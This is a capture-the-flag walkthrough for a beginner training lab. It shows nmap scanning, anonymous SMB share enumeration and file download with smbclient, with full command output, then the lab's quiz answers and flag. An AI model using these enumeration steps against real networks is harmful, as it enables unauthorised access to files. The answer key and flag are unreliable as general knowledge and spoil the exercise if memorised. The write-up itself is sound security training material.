Path: Starting Point
Module: The key is a strong foundation
Section: Dancing
Tier: 0

#################### PWN Process ####################

	- Opening openvpn connection

		sudo openvpn file.ovpn
	
	- Setting the target as an environment variable (for convenience)
		
		┌──(kali㉿kali)-[~]
		└─$ echo $t
		10.129.110.125
		
	- Scanning the targer's ports
	
		┌──(kali㉿kali)-[~]
		└─$ nmap -sV $t
		Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-25 04:24 EDT
		Nmap scan report for 10.129.110.125
		Host is up (0.046s latency).
		Not shown: 997 closed tcp ports (conn-refused)
		PORT    STATE SERVICE       VERSION
		135/tcp open  msrpc         Microsoft Windows RPC
		139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
		445/tcp open  microsoft-ds?
		Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		Nmap done: 1 IP address (1 host up) scanned in 10.31 seconds
		
		#As we can see there's a smb service running in port 445 (microsoft-ds)
		
	- Listing available shares
	
		┌──(kali㉿kali)-[~]
		└─$ smbclient -L $t
		Enter WORKGROUP\kali's password: 

				Sharename       Type      Comment
				---------       ----      -------
				ADMIN$          Disk      Remote Admin
				C$              Disk      Default share
				IPC$            IPC       Remote IPC
				WorkShares      Disk      
		Reconnecting with SMB1 for workgroup listing.
		do_connect: Connection to 10.129.110.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
		Unable to connect with SMB1 -- no workgroup available
		
		┌──(kali㉿kali)-[~]
		└─$ smbclient \\\\$t\\ADMIN                     
		Enter WORKGROUP\kali's password: 
		tree connect failed: NT_STATUS_BAD_NETWORK_NAME
				                                                                                                           
		┌──(kali㉿kali)-[~]
		└─$ smbclient \\\\$t\\C    
		Enter WORKGROUP\kali's password: 
		tree connect failed: NT_STATUS_BAD_NETWORK_NAME
				                                                                                                           
		┌──(kali㉿kali)-[~]
		└─$ smbclient \\\\$t\\IPC
		Enter WORKGROUP\kali's password: 
		tree connect failed: NT_STATUS_BAD_NETWORK_NAME
				                                                                                                           
		┌──(kali㉿kali)-[~]
		└─$ smbclient \\\\$t\\WorkShares 
		Enter WORKGROUP\kali's password: 
		Try "help" to get a list of possible commands.
		smb: \> ls
		  .                                   D        0  Mon Jul 25 08:47:23 2022
		  ..                                  D        0  Mon Jul 25 08:47:23 2022
		  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
		  James.P                             D        0  Thu Jun  3 04:38:03 2021

				        5114111 blocks of size 4096. 1749120 blocks available
		smb: \> cd Amy.J
		smb: \Amy.J\> ls
		  .                                   D        0  Mon Mar 29 05:08:24 2021
		  ..                                  D        0  Mon Mar 29 05:08:24 2021
		  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021

				        5114111 blocks of size 4096. 1749104 blocks available
		smb: \Amy.J\> more worknotes.txt
		getting file \Amy.J\worknotes.txt of size 94 as /tmp/smbmore.2tkELz (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
		smb: \Amy.J\> cd ..
		smb: \> ls
		  .                                   D        0  Mon Jul 25 08:47:23 2022
		  ..                                  D        0  Mon Jul 25 08:47:23 2022
		  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
		  James.P                             D        0  Thu Jun  3 04:38:03 2021

				        5114111 blocks of size 4096. 1752760 blocks available
		smb: \> cd James.P
		smb: \James.P\> ls
		  .                                   D        0  Thu Jun  3 04:38:03 2021
		  ..                                  D        0  Thu Jun  3 04:38:03 2021
		  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

				        5114111 blocks of size 4096. 1752760 blocks available
		smb: \James.P\> get flag.txt
		getting file \James.P\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.3 KiloBytes/sec)
		smb: \James.P\> exit
                        
		┌──(kali㉿kali)-[~]
		└─$ ls
		Desktop  Documents  Downloads  flag.txt  Music  Pictures  Public  Templates  Videos
				                                                                                                           
		┌──(kali㉿kali)-[~]
		└─$ cat flag.txt
		5f61c10dffbc77a704d76016a22f1664


#################### Questions ####################

	- What does the 3-letter acronym SMB stand for?
	
		Server Message Block
		
	- What port does SMB use to operate at?
	
		445
		
	- What is the service name for port 445 that came up in our Nmap scan?
	
		microsoft-ds
		
	- What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share?
	
		-L
		
	- What is the name of the share we are able to access in the end with a blank password?
	
		WorkShares
		
	- What is the command we can use within the SMB shell to download the files we find?
	
		get

################## FLAG ##################
#										 #
#    5f61c10dffbc77a704d76016a22f1664    #
#										 #
##########################################
